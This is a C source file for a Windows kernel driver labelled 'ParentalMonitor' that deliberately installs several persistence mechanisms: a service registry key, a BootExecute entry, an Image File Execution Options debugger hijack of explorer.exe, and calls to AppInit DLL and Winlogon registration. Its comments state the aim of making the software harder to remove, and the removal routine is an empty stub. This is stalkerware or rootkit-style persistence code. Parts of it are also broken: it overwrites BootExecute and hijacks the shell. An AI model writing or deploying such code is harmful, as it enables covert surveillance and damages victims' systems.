#include "core.h"
#ifndef MAX_PATH
#define MAX_PATH 260
#endif

// Establish multiple persistence mechanisms
NTSTATUS EstablishPersistence(VOID)
{
    NTSTATUS status;
    PDRIVER_CONTEXT context = GetDriverContext();
    
    if (!context) {
        return STATUS_UNSUCCESSFUL;
    }
    
    // Try multiple persistence techniques
    // The more techniques, the harder to remove
    
    // 1. Service persistence (primary)
    status = RegisterService();
    if (NT_SUCCESS(status)) {
        DbgPrint("[ParentalMonitor] Service persistence established\n");
    }
    
    // 2. Boot execute
    status = RegisterBootExecute();
    if (NT_SUCCESS(status)) {
        DbgPrint("[ParentalMonitor] Boot execute persistence established\n");
    }
    
    // 3. Image file execution (IFEO)
    status = RegisterImageFileExecution();
    if (NT_SUCCESS(status)) {
        DbgPrint("[ParentalMonitor] IFEO persistence established\n");
    }
    
    // 4. AppInit DLLs (for user-mode persistence)
    status = RegisterAppInitDlls();
    if (NT_SUCCESS(status)) {
        DbgPrint("[ParentalMonitor] AppInit DLLs persistence established\n");
    }
    
    // 5. Winlogon notify
    status = RegisterWinlogonNotify();
    if (NT_SUCCESS(status)) {
        DbgPrint("[ParentalMonitor] Winlogon notify persistence established\n");
    }
    
    context->PersistenceEstablished = TRUE;
    return STATUS_SUCCESS;
}

// Remove previously set persistence entries (stub for now)
NTSTATUS RemovePersistence(VOID)
{
    // TODO: remove each registry entry added in RegisterService/BootExecute/IFEO/etc.
    return STATUS_NOT_IMPLEMENTED;
}

// Register as a service
NTSTATUS RegisterService(VOID)
{
    UNICODE_STRING keyPath, valueName;
    WCHAR servicePath[MAX_PATH];
    ULONG pathLength;
    
    // Build service path
    RtlInitUnicodeString(&keyPath, 
        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\ParentalMonitor");
    
    RtlInitUnicodeString(&valueName, L"ImagePath");
    
    // Get current driver path (simplified - in reality we need to find our .sys file)
    // This is complex because we need to find where we're loaded from
    pathLength = sizeof(L"\\SystemRoot\\System32\\drivers\\ParentalMonitor.sys");
    RtlCopyMemory(servicePath, L"\\SystemRoot\\System32\\drivers\\ParentalMonitor.sys", pathLength);
    
    // Write to registry
    return WriteRegistryKey(&keyPath, &valueName, servicePath, pathLength, REG_SZ);
}

// Register in BootExecute
NTSTATUS RegisterBootExecute(VOID)
{
    UNICODE_STRING keyPath, valueName;
    WCHAR bootExecuteValue[256];
    
    RtlInitUnicodeString(&keyPath,
        L"\\Registry\\Machine\\System\\CurrentControlSet\\Control\\Session Manager");
    
    RtlInitUnicodeString(&valueName, L"BootExecute");
    
    // Append our autocheck command
    // Format: "autocheck autochk /k:ParentalMonitor *"
    RtlStringCbPrintfW(bootExecuteValue, sizeof(bootExecuteValue),
        L"autocheck autochk /k:ParentalMonitor *");
    
    return WriteRegistryKey(&keyPath, &valueName, bootExecuteValue, 
                          (ULONG)wcslen(bootExecuteValue) * sizeof(WCHAR), REG_MULTI_SZ);
}

// Image File Execution Options (IFEO) persistence
NTSTATUS RegisterImageFileExecution(VOID)
{
    UNICODE_STRING keyPath, valueName;
    WCHAR debuggerValue[MAX_PATH];
    
    // Target a common process
    RtlInitUnicodeString(&keyPath,
        L"\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe");
    
    RtlInitUnicodeString(&valueName, L"Debugger");
    
    // Set debugger to our driver (this is simplified)
    RtlStringCbPrintfW(debuggerValue, sizeof(debuggerValue),
        L"C:\\Windows\\System32\\svchost.exe -k netsvcs");
    
    return WriteRegistryKey(&keyPath, &valueName, debuggerValue,
                          (ULONG)wcslen(debuggerValue) * sizeof(WCHAR), REG_SZ);
}

// Helper: Write registry key
NTSTATUS WriteRegistryKey(
    PUNICODE_STRING KeyPath,
    PUNICODE_STRING ValueName,
    PVOID Data,
    ULONG DataSize,
    ULONG Type
)
{
    NTSTATUS status;
    OBJECT_ATTRIBUTES objectAttributes;
    HANDLE keyHandle = NULL;
    
    InitializeObjectAttributes(&objectAttributes,
                              KeyPath,
                              OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                              NULL,
                              NULL);
    
    // Create or open key
    status = ZwCreateKey(&keyHandle,
                        KEY_SET_VALUE | KEY_CREATE_SUB_KEY,
                        &objectAttributes,
                        0,
                        NULL,
                        REG_OPTION_NON_VOLATILE,
                        NULL);
    
    if (!NT_SUCCESS(status)) {
        DbgPrint("[ParentalMonitor] Failed to create/open key: 0x%X\n", status);
        return status;
    }
    
    // Write value
    status = ZwSetValueKey(keyHandle,
                          ValueName,
                          0,
                          Type,
                          Data,
                          DataSize);
    
    if (!NT_SUCCESS(status)) {
        DbgPrint("[ParentalMonitor] Failed to set value: 0x%X\n", status);
    }
    
    // Close key
    ZwClose(keyHandle);
    
    return status;
}
